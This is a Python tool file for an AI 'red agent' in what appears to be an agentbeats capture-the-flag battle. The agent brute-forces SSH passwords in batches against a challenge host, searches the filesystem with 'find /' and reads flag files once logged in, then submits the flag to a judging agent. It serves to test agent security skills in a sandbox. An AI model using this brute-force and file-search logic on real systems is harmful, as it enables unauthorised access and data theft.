# -*- coding: utf-8 -*-
"""
CTF Red Agent Tools - Password brute force competitor
"""

import json
import time
import agentbeats as ab
from typing import Dict, Any, Optional
import os

# Import SDK utilities
from agentbeats.utils.commands import SSHClient
from agentbeats.utils.agents import send_message_to_agent
from agentbeats.logging import BattleContext, record_battle_event, record_agent_action

# Global state
battle_context = None
ssh_client = None
challenge_info = None
flag_found = None
current_battle_id = None
green_agent_url = None
agent_id = None  # Store the agent's identifier

@ab.tool
def process_incoming_message(message: str) -> str:
    """Automatically process incoming messages and route them to appropriate handlers."""
    try:
        print(f"Processing incoming message: {message[:200]}...")  # Log first 200 chars
        
        # Try to parse as JSON
        try:
            message_data = json.loads(message)
        except json.JSONDecodeError:
            return f"Received non-JSON message: {message[:100]}..."
        
        # Check if this looks like a challenge message
        if "battle_id" in message_data or "ssh_host" in message_data or "user_persona" in message_data:
            print("Detected challenge message, calling handle_challenge_start")
            return handle_challenge_start(message)
        
        # Check if this is a flag submission response
        if "flag" in message_data or "winner" in message_data:
            print("Detected flag submission response")
            return f"Received response: {message_data}"
        
        # Default: just return the message type
        message_type = message_data.get('type', 'unknown')
        return f"Received message of type: {message_type}"
        
    except Exception as e:
        error_msg = f"Error processing incoming message: {str(e)}"
        print(error_msg)
        return error_msg

@ab.tool
def handle_challenge_start(challenge_data: str) -> str:
    """Handle challenge start message from green agent."""
    global challenge_info, current_battle_id, green_agent_url, battle_context, agent_id
    
    try:
        # Parse challenge data
        challenge_info = json.loads(challenge_data)
        
        # Extract BattleContext from challenge data
        battle_context_data = challenge_info.get("battle_context", {})
        print(f"DEBUG: battle_context_data: {battle_context_data}")
        
        if not battle_context_data:
            return "Error: No battle_context found in challenge data"
        
        # Create BattleContext from the provided data
        battle_context = BattleContext(
            battle_id=battle_context_data.get("battle_id", "ctf_password_brute_force"),
            backend_url=battle_context_data.get("backend_url", "http://localhost:9000"),
            agent_name=battle_context_data.get("agent_name", "CTF Red Agent (Competitor)")
        )
        
        # Extract agent identifier from BattleContext
        agent_id = battle_context.agent_name
        current_battle_id = battle_context.battle_id
        
        print(f"DEBUG: Created battle_context: {battle_context}")
        print(f"DEBUG: agent_id: {agent_id}")
        print(f"DEBUG: current_battle_id: {current_battle_id}")
        
        # Extract green agent URL from challenge data
        green_agent_url = challenge_info.get("green_agent_url")
        if not green_agent_url:
            print("Warning: No green_agent_url found in challenge data")
        
        # Log challenge start
        record_battle_event(
            battle_context,
            "Challenge received",
            {
                "ssh_host": challenge_info.get("ssh_host"),
                "ssh_port": challenge_info.get("ssh_port"),
                "username": challenge_info.get("username")
            }
        )
        
        # Store challenge info for later use
        challenge_info["agent_id"] = agent_id
        challenge_info["battle_id"] = current_battle_id
        
        print(f"Challenge initialized for agent {agent_id} in battle {current_battle_id}")
        return f"Challenge started for {agent_id} in battle {current_battle_id}"
        
    except Exception as e:
        error_msg = f"Error handling challenge start: {str(e)}"
        print(error_msg)
        return error_msg

async def _try_ssh_password(password: str) -> str:
    """Helper function to try SSH connection with a specific password."""
    global ssh_client, challenge_info, flag_found, current_battle_id
    
    try:
        if not challenge_info:
            print(f"DEBUG: challenge_info is None, current_battle_id: {current_battle_id}")
            return "No challenge info available. Run handle_challenge_start first."
        
        # If we don't have challenge info but we have a password to try, 
        # it means we received a challenge message but didn't process it
        if not challenge_info and password:
            print("DEBUG: No challenge info but trying password - challenge message may not have been processed")
            return "Challenge message not processed. Please call handle_challenge_start first."
        
        # Create SSH client if not exists
        if ssh_client is None:
            credentials = {
                "username": challenge_info["username"],
                "password": password,
                "port": challenge_info["ssh_port"]
            }
            
            ssh_client = SSHClient(challenge_info["ssh_host"], credentials)
        
        # Try to connect with the password
        print(f"Trying password: {password}")
        
        # Update credentials with new password
        ssh_client.credentials["password"] = password
        
        # Try to connect
        if ssh_client.connect():
            print(f"✅ Successfully connected with password: {password}")
            
            # Try to find and read the flag file
            print("Searching for flag file...")
            
            # First, try to find flag files
            find_result = ssh_client.execute("find / -name '*flag*' -type f 2>/dev/null")
            print(f"Find result: {find_result}")
            
            # Try common flag locations and scripts
            flag_locations = [
                "/root/flag.txt",
                "/flag.txt", 
                "/home/flag.txt",
                "/tmp/flag.txt",
                "/var/flag.txt"
            ]
            
            # Also try to execute flag generation scripts
            flag_scripts = [
                "/root/generate_flag.py",
                "/generate_flag.py",
                "/home/generate_flag.py"
            ]
            
            flag_content = None
            
            # First try static flag files
            for location in flag_locations:
                print(f"Trying location: {location}")
                flag_result = ssh_client.execute(f"cat {location}")
                print(f"Flag result for {location}: {flag_result}")
                
                if flag_result and not flag_result.startswith("Error:") and not "No such file" in flag_result:
                    if flag_result.startswith("Success:"):
                        flag_content = flag_result.replace("Success:", "").strip()
                    else:
                        flag_content = flag_result.strip()
                    print(f"Found flag at {location}: {flag_content}")
                    break
            
            # If no static file found, try executing flag scripts
            if not flag_content:
                for script in flag_scripts:
                    print(f"Trying script: {script}")
                    flag_result = ssh_client.execute(f"python3 {script}")
                    print(f"Flag result for {script}: {flag_result}")
                    
                    if flag_result and not flag_result.startswith("Error:") and not "No such file" in flag_result:
                        if flag_result.startswith("Success:"):
                            flag_content = flag_result.replace("Success:", "").strip()
                        else:
                            flag_content = flag_result.strip()
                        print(f"Found flag from script {script}: {flag_content}")
                        break
            
            if not flag_content:
                return f"Connected but couldn't find flag file. Find result: {find_result}"
            
            # Set the found flag
            flag_found = flag_content
            
            # Log success
            record_agent_action(
                battle_context,
                "Flag found",
                {
                    "password_used": password,
                    "flag": flag_content
                }
            )
            
            # Automatically submit the flag to the green agent
            try:
                import asyncio
                print(f"DEBUG: About to submit flag to green agent at {green_agent_url}")
                
                # Create a new event loop if one doesn't exist
                try:
                    loop = asyncio.get_event_loop()
                except RuntimeError:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                
                # Submit the flag
                submission_result = await submit_flag_to_green_agent(flag_content)
                print(f"DEBUG: Flag submission completed: {submission_result}")
                
                return f"🎉 SUCCESS! Flag found: {flag_content} | Submission: {submission_result}"
            except Exception as e:
                print(f"DEBUG: Error submitting flag: {str(e)}")
                import traceback
                traceback.print_exc()
                return f"🎉 SUCCESS! Flag found: {flag_content} (but submission failed: {str(e)})"
        else:
            return f"❌ Failed to connect with password: {password}"
        
    except Exception as e:
        error_msg = f"Error trying SSH password: {str(e)}"
        record_battle_event(
            battle_context,
            f"Error: {error_msg}"
        )
        return error_msg

@ab.tool
async def test_password_list(password_list: str) -> str:
    """Test a list of up to 10 passwords and return results."""
    try:
        passwords = json.loads(password_list)
        
        if not passwords:
            return "No passwords provided"
        
        # Limit to 10 passwords per batch
        if len(passwords) > 10:
            passwords = passwords[:10]
            print(f"Testing first 10 passwords out of {len(passwords)} total")
        
        # Log the batch of passwords being tested
        record_agent_action(
            battle_context,
            "Testing password batch",
            {
                "passwords": passwords,
                "batch_size": len(passwords)
            }
        )
        
        results = []
        success_found = False
        
        for i, password in enumerate(passwords):
            print(f"Testing password {i+1}/{len(passwords)}: {password}")
            
            result = await _try_ssh_password(password)
            results.append(f"Password {i+1}: {password} - {result}")
            
            # If we found the flag, stop
            if "SUCCESS!" in result:
                success_found = True
                results.append("🎉 SUCCESS! Stopping password testing.")
                break
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.5)
        
        summary = {
            "passwords_tested": len(passwords),
            "success_found": success_found,
            "results": results
        }
        
        return json.dumps(summary, indent=2)
        
    except Exception as e:
        return f"Error testing password list: {str(e)}"

@ab.tool
async def submit_flag_to_green_agent(flag_content: str) -> str:
    """Submit a flag to the green agent for validation."""
    global flag_found, current_battle_id, green_agent_url, battle_context, agent_id
    
    try:
        if not flag_content:
            return "Error: No flag content provided"
        
        if not green_agent_url:
            return "Error: Green agent URL not available"
        
        if not battle_context:
            return "Error: Battle context not available"
        
        # Use agent_name from BattleContext
        agent_name = battle_context.agent_name
        
        print(f"Submitting flag for {agent_name} in battle {current_battle_id}")
        print(f"Flag content: {flag_content}")
        print(f"Green agent URL: {green_agent_url}")
        
        # Prepare flag submission message
        flag_submission = {
            "type": "flag_submission",
            "battle_id": current_battle_id,
            "agent_name": agent_name,
            "flag": flag_content
        }
        
        # Log flag submission attempt
        record_agent_action(
            battle_context,
            f"Submitting flag: {flag_content[:20]}...",
            {
                "flag_length": len(flag_content),
                "green_agent_url": green_agent_url
            }
        )
        
        # Send flag submission to green agent
        response = await send_message_to_agent(green_agent_url, json.dumps(flag_submission))
        
        print(f"Flag submission response: {response}")
        
        # Log the response
        record_agent_action(
            battle_context,
            f"Flag submission response received",
            {
                "response": response[:100] + "..." if len(response) > 100 else response
            }
        )
        
        # Check if flag was correct
        if "winner" in response.lower() or "correct" in response.lower():
            flag_found = flag_content
            return f"SUCCESS! Flag submitted successfully: {response}"
        else:
            return f"Flag submission response: {response}"
        
    except Exception as e:
        error_msg = f"Error submitting flag: {str(e)}"
        print(error_msg)
        
        if battle_context:
            record_agent_action(
                battle_context,
                f"Flag submission error: {str(e)}",
                {"error": str(e)}
            )
        
        return error_msg